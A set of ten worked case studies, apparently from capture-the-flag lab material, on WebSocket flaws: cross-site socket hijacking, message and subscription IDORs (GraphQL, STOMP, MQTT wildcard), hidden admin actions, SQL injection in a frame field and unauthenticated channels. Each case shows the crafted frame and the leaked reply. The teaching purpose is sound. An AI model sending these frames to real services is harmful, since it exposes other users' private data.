# Case studies (deep) — the worked passes, each end-to-end

## Case 1: the chat-app CSWSH

```text
recon:    bundle -> wss://x/chat ; Socket.IO client ; emit 'history','dm'
handshake: --origin 'https://evil' -> 101 (accepted, no check)
binding:   Cookie:session -> the victim's socket
samesite:  Set-Cookie: session=x; SameSite=Lax  (travels top-level)
frame:     42["history",{"room":"dm"}] -> the victim's DMs -> the flag
verdict:   CSWSH — foreign-Origin + cookie-binding + data read
route:     web-websocket -> the victim's channel -> the flag
```

## Case 2: the message-IDOR

```text
recon:    bundle -> {"action":"open","doc":"my-doc-uuid"} ; the doc shape
frame:    {"action":"open","doc":"admin-doc"} -> {"doc":"admin-doc",
          "flag":"..."} -> a cross-principal read
verdict:  message-IDOR — the per-object scope check is absent
route:    web-websocket -> web-idor -> the flag
```

## Case 3: the hidden admin action

```text
recon:    bundle -> HANDLERS includes 'admin'/'debug' (the UI hides them)
frame:    {"action":"admin"} -> {"flag":"...","users":[...]}
verdict:  action-dispatch gap — the dispatch does not check role
route:    web-websocket -> the flag directly
```

## Case 4: the injection-in-frame

```text
recon:    {"action":"search","q":"x"} -> a query field
frame:    {"action":"search","q":"' UNION SELECT flag--"} -> {"rows":[
          {"flag":"..."}]}
verdict:  injection — the frame field reaches the query
route:    web-websocket -> web-sqli -> the flag
```

## Case 5: the token-in-URL

```text
recon:    bundle -> wss://x/ws?token=eyJ... (the JWT in the URL)
finding:  the token is in the URI -> logged -> a credential-in-URL
verdict:  web-auth-session / web-info-disclosure (not a channel gap)
note:     the channel itself may still carry a message-IDOR — two cells
```

## Case 6: the unauth channel

```text
recon:    no cookie/token -> 101
frame:    {"action":"dump"} -> {"flag":"...","users":[...]}
verdict:  unauth channel — the socket needs no credentials
route:    web-websocket -> the flag directly
```

## Case 7: the protobuf field

```text
recon:    binary frames -> proto_decode.py -> field 4 = the flag
frame:    a binary subscription frame -> a binary reply -> field 4
verdict:  a binary/protobuf channel carrying the flag in a field
route:    web-websocket -> proto_decode -> the flag
```

## Case 8: the graphql-ws subscription-IDOR

```text
recon:    Sec-WebSocket-Protocol: graphql-transport-ws
frame:    {"type":"subscribe","payload":{"query":"subscription{
          user(id:1){secret}}"}} -> another user's secret
verdict:  a subscription-IDOR — graphql-over-WS
route:    web-websocket -> web-graphql -> the flag
```

## Case 9: the STOMP queue-IDOR

```text
recon:    Sec-WebSocket-Protocol: v12.stomp ; the stomp client
frame:    SUBSCRIBE destination:/user/admin/queue
          -> MESSAGE destination:/user/admin/queue {flag:...}
verdict:  a queue-IDOR — a SUBSCRIBE to another's queue
route:    web-websocket -> web-idor -> the flag
```

## Case 10: the MQTT wildcard

```text
recon:    Sec-WebSocket-Protocol: mqtt
frame:    SUBSCRIBE {topic:"#", qos:0} -> every topic -> the flag topic
verdict:  a topic-IDOR — a wildcard subscription
route:    web-websocket -> web-idor -> the flag
```

## The pattern

Each case: recon → the handshake cell → the message cell → the verbatim
cross-boundary reply → the route. The corpus covers all four
mechanisms (CSWSH/unauth/IDOR/dispatch) + the injection + the framing.
